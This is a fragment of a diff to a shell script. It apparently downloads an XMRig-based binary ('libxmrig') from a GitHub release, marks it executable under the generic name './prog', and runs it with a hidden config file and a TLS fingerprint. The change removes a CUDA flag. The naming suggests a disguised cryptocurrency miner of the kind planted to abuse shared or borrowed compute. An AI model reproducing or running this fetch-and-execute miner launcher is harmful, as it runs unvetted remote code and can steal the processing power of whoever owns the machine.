@@ -10,4 +10,4 @@ curl -L -O https://github.com/iceyfromdiscord/cuda/releases/download/_/libxmrig-
 
 # start
 chmod +x ./prog
-./prog -c ./_.json --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --cuda
+./prog -c ./_.json --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
